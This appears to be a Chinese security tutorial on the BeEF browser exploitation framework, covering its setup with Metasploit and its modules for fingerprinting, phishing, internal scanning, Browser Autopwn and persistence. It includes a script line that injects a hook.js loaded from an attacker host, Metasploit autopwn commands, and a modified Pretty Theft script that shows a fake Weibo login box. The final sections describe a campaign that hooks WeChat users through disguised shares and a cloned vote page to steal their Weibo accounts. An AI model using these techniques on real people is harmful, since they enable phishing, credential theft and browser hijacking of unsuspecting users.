# 浏览器利用框架BeEF测试

0x00 前言
=======

* * *

BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 目前对其测试的文章不是很多，所以希望通过本次测试给大家带来全新的认识。

![这里写图片描述](http://drops.javaweb.org/uploads/images/68e7f4893eb8c37f9d32414f709e3a2106db1940.jpg)

0x01 简介
=======

* * *

工具主页：[http://beefproject.com](http://beefproject.com/)

工具框架:

![这里写图片描述](http://drops.javaweb.org/uploads/images/06ff4eabfc20602671192c3ccf2dc0831cb2556e.jpg)

0x02 测试环境
=========

* * *

攻击主机:

```
操作系统:Kali 1.0
IP:192.168.16.245

```

测试主机:

```
操作系统:Win7x86
IP:192.168.16.197

```

路由器：

```
WooyunWifi
开启JS注入功能

```

![这里写图片描述](http://drops.javaweb.org/uploads/images/1f0092881dcb1c24b99540d30576d6f8b73e5ae9.jpg)

**_Tips：_**

```
WooyunWifi开启JS注入功能后会对用户访问的页面加入JS代码，如果JS代码设置成如下格式，那么运行后会在BeEF控制端返回一个shell

document.write("<script language='javascript' src='http://192.168.16.245:3000/hook.js'></script>");

默认情况下JS注入附带缓存投毒功能，将视图缓存所有的页面至2099年，但可以通过清除所有缓存及浏览数据来清除缓存投毒的影响。

```

![这里写图片描述](http://drops.javaweb.org/uploads/images/207ac0a0029ed164b5954705a5bbd714b4a66e33.jpg)

0x03 BeEF参数配置
=============

* * *

BeEF在Kali下默认安装，直接找到对应图标启动即可，但是默认设置未同Metasploit关联，无法使用msf模块，因此需要作如下配置连接msf

1、修改config.yaml
---------------

编辑  
`/usr/share/beef-xss/config.yaml`

```
metasploit:
            enable: false改为true

```

![这里写图片描述](http://drops.javaweb.org/uploads/images/ee9ef3f8df70142f794203f1e835a67929f1bff1.jpg)

编辑  
`/usr/share/beef-xss/extensions/demos/config.yaml`

```
enable:true改为false

```

编辑  
`/usr/share/beef-xss/extensions/metasploit/config.yaml`

```
设置
    ssl: true
    ssl_version: 'TLSv1'

```

![这里写图片描述](http://drops.javaweb.org/uploads/images/7a6b622612f764a800b5221f397d637ad0c036e3.jpg)

2、启动msf服务
---------

```
service postgresql start
service metasploit start
msfconsole
load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y

```

3、运行BeEF.rb
-----------

```
cd /usr/share/beef-xss/
/usr/share/beef-xss/beef

```

（启动后不要关闭，不然登录界面会提示密码错误）

![这里写图片描述](http://drops.javaweb.org/uploads/images/3a18591f698922fcc5218e6f7ecfcbd2b62426cd.jpg)

4、启动BeEF
--------

弹出浏览器，输入默认用户名口令beef，即可登陆

主界面如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/c0fc59eaf291f59923134cef3de1e711f9266ba8.jpg)

0x04 功能介绍
=========

* * *

对基本功能做全面介绍，高级用法以后会做补充

1-信息收集
------

**1、浏览器信息**可收集：

```
浏览器名称版本
浏览器用户版本
插件（包括Java，ActiveX，VBS，Flash……）
窗口大小

```

收集方法：

（1）自动默认收集信息  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/677e8112aa3467049058c4abbb630bb16ae037c3.jpg)

（2）插件收集信息  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/8d48dfd3eb57b255eb96f7d56bfb7ef0f74a667a.jpg)

**_Tips：_**

```
模块图标不同颜色对应不同的使用效果
绿色：适用当前浏览器
橙色：适用当前浏览器，但易被用户发现，social engineering模块默认为橙色
红色：不适于当前浏览器，但仍可尝试

```

**2、系统信息**

可收集：

```
安装的软件(适用于IE下，Detect Software模块)
注册表键值(适用于IE下，此时会弹出提示消息)
内网IP(Java模块得到授权)
系统详情(通过JavaApplet获取系统版本、Java VM details、NIC names and IP、处理器、内存、屏幕显示模式)
定位(通过Google maps)
剪贴板信息(会弹出提示消息)

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/eaf68299ba7a705a0af5e9edf41841aa55559fc6.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/0f6f8803cc86827b4129c0aec5c56b0197f4ee59.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/7cafc26bfc37c422b846bbbb581cfad042ee2b19.jpg)

**3、用户行为**

可收集：

```
用户是否访问过某URL、domain
是否登录特定网站账号
是否使用TOR

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/9b7d1abcbc5e24f0b4f072033bf7a4f898f5f2ee.jpg)

2-社会工程
------

如果使用BeEF控制了浏览器，那么就可以修改整个页面来尝试社会工程学

**1、提交登录信息**

简单粗暴往往是最有效的

**Pretty Theft模块:**

在网页弹出诱骗消息需要用户输入登录和密码，并解释该会话已超时

选择的登录框模板,如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/663d8579ab779611f0bd226f4b7e8e27989ccc74.jpg)

配置后用户浏览器界面,如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/84d95d1d6e40c2178f6dad32cb37d831dec7046c.jpg)

当用户输入信息后，自动获取，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1267f16bc175d92cd0ae430db2f045eae6fa5748.jpg)

**Simple Hijacker模块:**

劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/7dda58a74d78e466becccd95ce6cc26ae9f11468.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/7e8ffcbb9700e873d8618a8ec99b6892b6f5eace.jpg)

**Clippy模块：**

创建一个浏览器助手提示用户点击  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/a9b24c6921f7022f875a1d8224cc61a9e4c5157b.jpg)

**2、重定向**

**Rediret Browser模块：**

将当前页面重定向至指定页面，有可能导致当前权限丢失

**Rediret Browser(iframe)模块：**

将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/7fa2c24afb59124ade07f0e445e8d72d6e1d04f6.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/ab2fb631bb2d64472fab066666952930dbd46a33.jpg)

**TabNabbing模块：**

当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/f380c33d9ded2f253e4fb272e2f9d04e46139837.jpg)

**3、Chrome/Firefox extensions**

**Fake Flash Update模块：**

提示用户安装Adobe Flash Player的更新，用户点击后会下载指定文件  
如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/9d5f5b3a2e3cf028455c1b3cc7817a30b8b82285.jpg)

**Chrome Extensions 系列：**

值得尝试

![这里写图片描述](http://drops.javaweb.org/uploads/images/5f6621f08f215ede7a53d1f3de079eed0130832e.jpg)

**4、补充**

**Clickjacking模块：**

可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码  
如图，鼠标后面跟随一个iframe

![这里写图片描述](http://drops.javaweb.org/uploads/images/ed9eeb18e402de623b3f8d174e91534a990a197a.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/543733de50602b4d53dffe9745ebcca76ede6d45.jpg)

3-网络扫描
------

通过JavaScript，可以尝试利用浏览器扫描内网

**1、获取内网IP**

**Get Internal IP WebRTC模块：**

通过WebRTC获取内网IP

**Get Internal IP模块：**

通过Java Socket class获取内网IP

**2、识别局域网子网**

识别内网网关，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1fd492832dc0b51e24252c76aad1357476036669.jpg)

**3、识别HTTP Servers**

识别内网web servers

**4、ping操作**

调用ping命令扫描内网

**Ping Sweep模块 Ping Sweep (Java)模块**

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/e41d63b9601e3b7d2065f397420bbd0dbad0381b.jpg)

**5、跨域扫描**

**6、DNS枚举**

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/6e877c158b64f60d07f21bcb5f93abefb066d34c.jpg)

**7、端口扫描**

**Port Scanner模块**

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1a6bf89756d313fa8d9348ecb8627898ce113b5b.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/21f687b7c768119dda4b6831aed6a1fb1f62700b.jpg)

**8、网络指纹特征扫描**

用来扫描内网中的Web服务器和网络设备

**Fingerprint Network模块**

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/c20525022470867a59865ee3e83ee9cf66b8b161.jpg)

**9、Remote CSRFs**

**10、IRC NAT Pinning**

模拟浏览器的IRC通信，可用来绕过防火墙

**11、网络拓扑**

BeEF可根据扫描获得的信息绘制内网网络拓扑 如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/eb3631dddf9f319db71904f8d4f0f4e110fbb962.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/07bdf7d3ff47754198b74f782e96e9d35f6a98e7.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/f0df8dec37787421e9c9b8eb30eff1afd7c31105.jpg)

此部分会在以后详细介绍

4-结合Metasploit
--------------

**1、Metasploit系列模块**

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/0db557bf633a0ad166ac945110422ac4666be8b2.jpg)

**2、Browser Autopwn**

反弹回meterpreter

方法：

**（1）**使用Metasploit的Browser Autopwn功能生成BrowserAutoPwn URL

```
use auxiliary/server/browser_autopwn
show options
set LHOST 192.168.16.245
set SRVHOST 192.168.16.245
set SRVPORT 8881
run -z

```

生成一个链接，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/6a3072d55750ddedc48726f64a77bca1f790bfa6.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/4c08677fff0d2dfe6a596aa800d43a67267edf08.jpg)

**（2）**使用"Create Invisible Iframe"模块加载autopwn页面

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/b0d3b3162be3db3050697e10641573c43ecc40b6.jpg)

**（3）**等待弹回shell

```
sessions -l

```

5-Tunneling
-----------

代理功能

方法：

**1、**选择控制的浏览器

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/f5d510a4f15bcd94c6614caa40a30be8d1298f74.jpg)

**2、**浏览器代理设置

HTTP Proxy：127.0.0.1  
Port：6789

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/6bb72008c6b030ed27692524dc8a9248a7c33c3d.jpg)

细节以后补充

**3、**访问同样网站，查看本机浏览器页面同被控浏览器页面内容是否相同（即不需要cookie可实现登录账号）

6-XSS
-----

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/7d5ae2f907c1e30b0d8036411dee9ffc5f39d4c1.jpg)

细节以后补充

7-维持权限
------

**1、Create Pop Under模块**

创建一个新窗口，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/763b38784243793ac43491c1d7cd47bca278fc56.jpg)

反弹一个新权限，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/e7b95c2dcb54c99612e1188655554b4d7f8eeaa2.jpg)

**2、Confirm Close Tab模块**

当用户关闭当前页面时，反复弹出确认是否关闭页面的消息

**3、Create Foreground iFrame模块**修改当前页面所有链接来避免离开当前页面  
比如用户点击某个连接，会将新页面显示在当前页面上面，注意的是网址不会发送改变，如图：

![这里写图片描述](http://drops.javaweb.org/uploads/images/5fef55c47f5d8d182199b85515b9a4ebf2c8bbdb.jpg)

正常访问的页面为：（注意看地址栏）

![这里写图片描述](http://drops.javaweb.org/uploads/images/a70a9cc8c8e309a6928686754075ee999d0fd3f0.jpg)

**4、Man In The Browser模块**

可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）  
如果用户手动更改URL地址栏，无法维持权限

0x05 小结
=======

* * *

本文仅对BeEF的基本功能做了全面介绍，更多高级技巧很值得研究，例如利用BeEF内网渗透，利用代理不通过cookie登陆账户突破IP限制绑定等等。

测试过程难免会有疏忽遗漏，理解错误的地方欢迎指正，共同进步。

本文由三好学生原创并首发于乌云drops，转载请注明

0x06 补充
=======

* * *

对手机平台的微信使用BeEF进行模拟测试

手机系统:

```
Android

```

1、上线方法：
-------

**1、扫描二维码**

扫描后在BeEF控制端看到手机上线，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/2b84f61cd2502e28dade35ab8259df6bc307cf5d.jpg)

对此页面进行Google Phishing欺骗，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/9339fe3b250cdda225ce8d1b938aafaa72bb29b7.jpg)

**注：**

在微信上面特别的地方在于此处无法看到包含的真实URL地址

**2、朋友圈分享**

将BeEF的上线地址做一下简单的伪装并分享到朋友圈，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/134b554d846923dca6ed846ff3dcc236a47ccf8f.jpg)

在朋友圈中同样无法看到包含的真实URL地址，打开即为BeEF的hook页面，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/d232bcbba09c7e764bad3cdc4f4ac9a7c9dca995.jpg)

**3、朋友发来的链接**

将此消息直接发给朋友，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1f2a045945f87168eacae579ed32b70eb7e48155.jpg)

我们可以看到伪造前的URL地址

**注：**

BeEF的hook页面可以自定义成更具欺骗性的内容，这是为了演示方便使用默认界面

2、微信浏览器被Hook后可以做哪些操作
--------------------

也许有人会提出疑问：手机打开网址持续的时间很短，关闭当前页面后BeEF的shell就会下线

**解决方法：**

使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间

除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/f35921f8e5a2c78b294a463e0fd5297665807a00.jpg)

以下是经测试可以在Android上使用的模块：

```
1、弹框
2、重定向 
3、查看是否访问过某些网站
4、Creates an invisible iframe
5、Social Engineering系列，如下图，仅作演示 
6、msf系列
7、NetWork系列，可以用来扫描同一内网下的windows主机

```

![这里写图片描述](http://drops.javaweb.org/uploads/images/7ca5231cf9666986ddfc0109a2dad6a39ef3466e.jpg)

**注：**

加载hook页面后，将手机屏幕关闭处于待机状态，BeEF仍然可以执行指令，或许这与手机系统相关，值得以后深入测试。

0x07 利用朋友圈投票社工微博帐号实例
====================

* * *

1、伪造BeEF的hook页面
---------------

**1、寻找模板**

随机找到一个投票的页面，保存为html

```
http://mp.weixin.qq.com/s?__biz=MzA3MTM0NTgyNw==&mid=400240804&idx=1&sn=d87655d4c67a8f39fc84b3cdcb4c1895&scene=1&srcid=1024yDcPJI2to0i3DmiVmj1L&from=groupmessage&isappinstalled=0#rd

```

**2、替换hook页面**

在`use/share/beef-xss/extensions/demos/html`目录下，将上述html文件命名为basic.html并添加以下代码

```
var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" 
type="text/javascript"><\/script>';
        document.write(commandModuleStr);

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/714bfea145bcc3d83b7f6540bda59cb62a8f2b50.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/d2068ec4447fb38d1c46d423e39df8661daa1b32.jpg)

上线页面已被修改

2、修改BeEFsocial_engineering模块
----------------------------

修改弹出对话框样式

将此文件use/share/beef-xss/modules/social_engineering/pretty_theft/command.js内容 对应部分替换如下：

```
// Facebook floating div
    function facebook() {

        sneakydiv = document.createElement('div');
        sneakydiv.setAttribute('id', 'popup');
        sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:2%; z-index:51; background-

color:ffffff;');
        document.body.appendChild(sneakydiv);

        // Set appearance using styles, maybe cleaner way to do this with CSS block?
        var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-

radius:8px"';
        var windowmain = 'style="border:1px #555 solid;"';
        var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(255, 102, 0);font-size: 

13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: 

left;height: 18px;"';
        var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 

8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
        var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-

serif;margin:10px 15px;line-height:12px;height:40px;"';
        var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: 

tahoma,verdana,arial,sans-serif;padding-left:30px;"';
        var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-

left:4px;border-style: solid;border-width: 1px;border-color: rgb(255,102,0);"'; 
        var buttonstyle = 'style="font-size: 13px;background:#ff6600;color:#fff;font-weight:bold;border: 

1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';

            var title = '微博手机版安全登录';
            var messagewords = '请输入您的用户名密码登录后进行投票。<br/><br/>我们将对您的投票信息严格保密。';
            var buttonLabel = '<input type="button" name="ok" value="登录" id="ok" ' +buttonstyle+ ' 

onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" 

onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

        // Build page including styles
        sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' 

+windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + 

messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>邮箱/会员帐号/手机号: 

</div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) 

document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div 

id="box_pre" ' +box_prestyle+ '>密码: </div></td><td align="left"><input type="password" id="pass" name="pass" 

onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ 

'/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" 

id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

        // Repeatedly check if button has been pressed
        credgrabber = setInterval(checker,1000);
    }

```

3、实际操作
------

**1、**微信朋友圈发布投票消息，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/9387c50c1353ad73d0ff9cf8b0b41ac08d201ab8.jpg)

用户点击后会打开我们伪造的投票页面，同时隐蔽加载hook.js，在BeEF端上线

**2、**在用户手机弹出模拟微博登录的对话框

如图执行Pretty Theft模块

![这里写图片描述](http://drops.javaweb.org/uploads/images/b10c4646e7ed6f828c0c54ee9c333c52e8a79813.jpg)

用户手机界面如图，弹出对话框提示输入登录消息

![这里写图片描述](http://drops.javaweb.org/uploads/images/5d9426624e22fc3fa494b1557fe5cb77256b035d.jpg)

BeEF控制端返回用户输入消息，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/85f00e2597ae3898897af56d44fe8117b824007d.jpg)

**3、**用户提交后重定向至另一页面

BeEF控制端使用Redirect Browser（iFrame）模块，如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/bf206620f32a62b094025b9b8d891cff7dcb8f60.jpg)

用户手机界面如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/488c2d32660bed9532f713bd3715ac7d97788698.jpg)

至此，通过朋友圈投票获得微博帐号成功实现。